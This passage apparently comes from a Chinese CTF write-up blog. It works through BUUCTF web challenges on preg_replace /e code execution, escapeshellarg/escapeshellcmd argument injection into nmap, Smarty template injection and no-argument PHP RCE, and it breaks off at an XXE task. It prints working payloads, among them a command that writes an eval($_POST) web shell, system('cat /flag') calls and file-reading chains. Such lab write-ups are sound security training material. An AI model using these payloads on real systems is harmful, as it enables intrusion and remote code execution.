<span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a href="https://">http://www.xinyueseo.com/websecurity/158.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Sentry-fei/p/15476811.html%E8%BF%99%E9%87%8C%E6%9C%89%E4%B8%80%E4%BA%9B%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95">https://www.cnblogs.com/Sentry-fei/p/15476811.html这里有一些本地测试</a><br><a href="https://">https://www.runoob.com/php/php-preg_replace.html</a></p>
<p><code>\1</code> 代表正则表达式中第一个捕获组所匹配到的内容</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'{${phpinfo()}}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结果：字符串'11'</span>
<span class="token comment">#由于替换字符串是简单的 '1'，PHP 会尝试将其当作代码执行，但它并不是有效的 PHP 表达式。不过在这种情况下，preg_replace 的行为比较特殊，由于正则表达式匹配到整个字符串，并且替换字符串会被执行，最终的替换结果会出现两次 '1'，所以输出为 '11'</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'strtolower("\1")'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'{${phpinfo()}}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结果：空字符串''</span>
<span class="token comment">#\1 代表第一个捕获组匹配的内容，也就是整个输入字符串 {${phpinfo()}}。strtolower 函数用于将字符串转换为小写。然而，当 phpinfo() 被执行时，它会输出大量的 PHP 配置信息到标准输出流，并且 strtolower 函数对 phpinfo() 的返回值（实际上 phpinfo() 返回值为 null）进行处理，最终导致整个替换操作的结果变得混乱。由于 phpinfo() 输出了内容，并且在这种执行逻辑下，最终返回给 preg_replace 的结果可能为空字符串，所以最终输出为 ''。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>\\</code> 会转义为单个 <code>\</code>，所以这里的 <code>\1</code> 代表正则表达式中第一个捕获组所匹配到的内容。</p>
<p>.* 整体的意思是匹配任意数量（包括零个）的任意字符。e 修饰符存在严重的安全隐患。因为它允许执行任意 PHP 代码<br>${phpinfo()} ：不执行<br> {${phpinfo()}}：执行</p>
<blockquote>
<ul>
<li><strong><code>.</code></strong>：在正则表达式中，点号（<code>.</code>）是一个元字符，它默认匹配除换行符之外的任意单个字符。例如，在字符串 <code>"abc"</code> 中，<code>.</code> 可以匹配 <code>a</code>、<code>b</code> 或者 <code>c</code> 中的任意一个字符。</li>
<li><strong><code>\S</code></strong>：这是一个预定义字符类，<code>\S</code> 表示匹配任意非空白字符。空白字符包括空格、制表符、换行符等，非空白字符就是除这些之外的字符，比如字母、数字、标点符号等。</li>
<li><strong><code>\*</code></strong>：这是一个量词，它表示前面的元素可以出现零次或多次。在 <code>\S*</code> 中，意味着非空白字符可以出现零个、一个或者多个连续的非空白字符。</li>
</ul>
</blockquote>
<!--strtolower("{${1}}") 又相当于 strtolower("{null}"), 又相当于 ``''` `空字符串。单纯地将整个字符串中的大写字母转换为小写。同样，对于 `"{null}"`，`strtolower` 也是对整个字符串进行处理。这两个字符串在 `strtolower` 函数的处理过程中，而它们本身都没有大写字母-->

<!--将.*改成\S*-->(在PHP中，对于传入的非法的 $_GET 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。)

<p>动态赋值的过程，即会将get请求中的参数名作为键$re，参数对应的值作为键值$str</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/('</span><span class="token operator">.</span>\<span class="token constant">S</span><span class="token operator">*</span><span class="token operator">.</span><span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#'.\S*.' 这个正则表达式整体的含义是匹配以任意一个非换行字符开始，接着是零个或多个非空白字符，最后再以任意一个非换行字符结束的字符串</span>
<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">=&gt;</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("${getFlag()}")'</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">=&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'${getFlag()}'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>next.php?\S*=${getFlag()}&amp;cmd=system('cat /flag');</code></p>
<hr>
<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>[<a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/#escapeshellarg">浅谈escapeshellarg逃逸与参数注入  Mi1k7ea ]http://www.mi1k7ea.com/2019/07/04/浅谈escapeshellarg与参数注入/#escapeshellarg</a></p>
<p><strong>escapeshellarg</strong></p>
<p>主要是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”。</p>
<p>处理过程：如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p>
<p>场景功能：</p>
<blockquote>
<p>1.确保用户只传递一个参数给命令</p>
<p>2.用户不能指定更多的参数一个</p>
<p>3.用户不能执行不同的命令</p>
</blockquote>
<p><strong>escapeshellcmd</strong></p>
<p>主要是防止用户利用shell的一些技巧（如分号、管道符、反引号等）来进行命令注入攻击。</p>
<p>处理过程：如果输入内容中&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF等特殊字符会被反斜杠给转义掉；如果单引号和双引号不是成对出现时，会被转义掉。</p>
<p>场景功能：</p>
<blockquote>
<p>1.确保用户只执行一个命令</p>
<p>2.用户可以指定不限数量的参数</p>
<p>3.用户不能执行不同的命令</p>
</blockquote>
<p>通过参数注入向参数选项注入<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">谈escapeshellarg绕过与参数注入漏洞 | 离别歌</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php
<span class="token function">system</span><span class="token punctuation">(</span><span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls --ignore="</span><span class="token operator">.</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" /tmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//echo escapeshellcmd("ls --ignore=".escapeshellarg($_GET[c])." /tmp");</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token comment">//初始输入</span>
alan<span class="token string single-quoted-string">' -l+

//经过escapeshellarg()处理
'</span>alan<span class="token string single-quoted-string">'\''</span> <span class="token operator">-</span>l<span class="token operator">+</span><span class="token string single-quoted-string">'

//拼接命令
ls --ignore='</span>alan<span class="token string single-quoted-string">'\''</span> <span class="token operator">-</span>l<span class="token operator">+</span><span class="token string single-quoted-string">' /tmp

//经过escapeshellcmd()处理，即上图的输出结果
ls --ignore=\'alan\'\\\'\' -l+ /tmp
ls --ignore='</span>alan<span class="token string single-quoted-string">'\\'</span><span class="token string single-quoted-string">' -l+\' /tmp

//输出结果简化，等同于
ls --ignore=alan\ -l '</span> <span class="token operator">/</span>tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p><strong>当用户输入包含单引号时，先用escapeshellarg()处理会给该单引号添加转义符，再用escapeshellcmd()处理时会将该添加的转义符再添加一个转义符，从而导致单引号被逃逸掉，从而造成参数注入漏洞的存在；</strong></p>
</li>
<li><p>如果是先用escapeshellcmd()函数过滤，再用escapeshellarg()函数过滤，则不存在参数注入漏洞；</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#（可以加点东西</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<p><code>-oG</code> 参数用于将 <code>nmap</code> 的扫描结果以 Grepable 格式输出到指定的文件中。</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -oG &lt;output_file&gt; [其他扫描参数] &lt;目标主机或网络&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><code>&lt;output_file&gt;</code>：这是指定的输出文件名，扫描结果会被保存到这个文件中。</li>
<li><code>[其他扫描参数]</code>：可以包含 <code>nmap</code> 的各种扫描选项，例如 <code>-sT</code>（TCP 连接扫描）、<code>-F</code>（快速扫描，只扫描常见的 100 个端口）等。</li>
<li><code>&lt;目标主机或网络&gt;</code>：可以是单个 IP 地址、IP 地址范围或者域名等。</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>host<span class="token operator">=</span><span class="token string single-quoted-string">' 《?php @eval($_POST["pass"]);?&gt; -oG pass.php '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="http://122b544d-074b-44b4-8d5d-131449927350.node5.buuoj.cn/e6305cd14dbe6e1fc4041d81cb3fc9ee/pass.php">122b544d-074b-44b4-8d5d-131449927350.node5.buuoj.cn/e6305cd14dbe6e1fc4041d81cb3fc9ee/pass.php</a></p>
<p>[BUUCTF 2018 Online Tool | Kid](<a target="_blank" rel="noopener" href="https://nkcell.github.io/2019/09/10/BUUCTF">https://nkcell.github.io/2019/09/10/BUUCTF</a> 2018  Online Tool/)</p>
<p>不知是不是版本的问题，我按上方文章实验escapeshellarg()与escapeshellcmd()却达到不了想要的效果</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">《?php
$host = "' <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> -oG pass.php '";
$host = escapeshellarg($host);
echo $host;
echo "\n";
$host = escapeshellcmd($host);
echo $host;

" <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> -oG pass.php "
^" ^<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>^?php</span> <span class="token attr-name">phpinfo^(^)^;^?^</span><span class="token punctuation">&gt;</span></span> -oG pass.php ^"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有无一样的友友？</p>
<hr>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>嘶~，但我看了看我IP不是这个呀（</p>
<pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: xaxaxa
Your IP is : xaxaxa	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><del>果然不靠谱（</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d2bfef660a8dbbc2293e833c8c858b89.png"></p>
<p>所以不是flask该咋办？</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14141">文章 - PHP中的模板注入漏洞刨析 - 先知社区</a></p>
<p>试了一下不是Twig,是Smarty（<code>{$smarty.version}</code>）</p>
<pre class="line-numbers language-none"><code class="language-none">{system('ls /')} 
{system('cat /flag')} 
flag{7dd4f5f5-a7dd-43f8-b966-4c180f72af17}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0aa3233bf98122217b8d372ac0a13cc2.png"></p>
<p>说实话给我看傻了，咋一堆git（</p>
<p>GitHack启动（<code>python2 GitHack.py http://9211086e-5637-4026-a306-d75d0b458824.node5.buuoj.cn:81/.git/</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// echo $_GET['exp'];</span>
                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// highlight_file(__FILE__);</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token comment">//[a-z,_]+：</span>
<span class="token comment">//[ ] 为字符类，用于匹配方括号内指定的任意一个字符。</span>
<span class="token comment">//a-z 表示匹配所有小写字母。</span>
<span class="token comment">//,_ 表示匹配逗号 , 或下划线 _。</span>
<span class="token comment">//+ 是量词，意味着前面的字符类至少出现一次。综合起来，[a-z,_]+ 用于匹配由一个或多个小写字母、逗号或下划线组成的字符串，通常对应函数名。</span>
<span class="token comment">//\(`**：     - 由于括号在正则表达式中有特殊含义，所以使用反斜杠 `\` 进行转义，这里表示匹配左括号 `(`，用于标识函数调用的起始。`(?R)?`： - `(?R)` 是递归引用语法，它会递归地引用整个正则表达式本身。在这个情境下，用于匹配函数内部可能嵌套的函数调用。     - `?` 是量词，表示前面的元素（即递归引用部分）可以出现 0 次或 1 次，意味着函数调用可以嵌套，也可以不嵌套。  - **`\)：</span>
<span class="token comment">//同样使用反斜杠 \ 对右括号进行转义，用于匹配函数调用结束的右括号 )。</span>
 <span class="token comment">//(?R) 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。</span>
   <span class="token comment">// scandir()可以使用里面不含参数</span>
<span class="token comment">//scandir('1')不可以使用，里面含有参数1，无法被替换删除</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76690905/article/details/133808536#:~:text=%E7%9B%AE%E5%BD%95%E6%97%A0%E5%8F%82%E6%95%B0RCE%E9%A2%98%E7%9B%AE%E7%89%B9%E5%BE%81%EF%BC%9A%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D%EF%BC%9A%E2%80%A6">无参数RCE绕过的详细总结（六种方法）_无参数的取反rce-CSDN博客</a></p>
<p>文章有具体写</p>
<p>在大多数操作系统的文件系统里，点号（<code>.</code>）是一个特殊的路径表示，它代表当前工作目录。<code>scandir()</code> 函数会将其解释为当前工作目录，并对该目录进行扫描。 <code>.</code>表示当前目录本身，<code>..</code> 表示父目录。</p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-localeconv.html">PHP localeconv() 函数 | 菜鸟教程</a></p>
<p>localeconv():返回一个包含本地数字及货币格式信息的数组,该数组的第一项就是’.’(这也太巧了吧，一般也猜不到)</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e0593316e12840a8e64914fd4b01fc4a.png"></p>
<blockquote>
<p>scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）<br>localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）<br>current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西<br>getcwd() :取得当前工作目录<br>dirname():函数返回路径中的目录部分<br>array_flip() :交换数组中的键和值，成功时返回交换后的数组<br>array_rand() :从数组中随机取出一个或多个单元</p>
<p>array_reverse():将数组内容反转</p>
<p>strrev():用于反转给定字符串</p>
<p>getcwd()：获取当前工作目录路径</p>
<p>dirname() ：函数返回路径中的目录部分。<br>chdir() ：函数改变当前的目录。</p>
<p>eval()、assert()：命令执行</p>
<p>hightlight_file()、show_source()、readfile()：读取文件内容</p>
<p>end() ： 将内部指针指向数组中的最后一个元素，并输出<br>next() ：将内部指针指向数组中的下一个元素，并输出<br>prev() ：将内部指针指向数组中的上一个元素，并输出<br>reset() ： 将内部指针指向数组中的第一个元素，并输出<br>each() ： 返回当前元素的键名和键值，并将内部指针向前移动</p>
</blockquote>
<p><code>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p>
<hr>
<p>or用session_id .使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p>
<p> 首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现</p>
<p>readfile(session_id(session_start()));</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2ff73e9f63c038fbb87aa5fdc1686fdc.png"></p>
<p>在源代码</p>
<hr>
<h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">doLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">var</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> password <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Please enter the username and password!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token string">"&lt;user&gt;&lt;username&gt;"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"&lt;/username&gt;&lt;password&gt;"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"&lt;/password&gt;&lt;/user&gt;"</span><span class="token punctuation">;</span> 
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"doLogin.php"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">contentType</span><span class="token operator">:</span> <span class="token string">"application/xml;charset=utf-8"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span>
        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"xml"</span><span class="token punctuation">,</span>
        <span class="token literal-property property">anysc</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token comment">//这里存在拼写错误，正确的应该是 async: false(哈？)</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
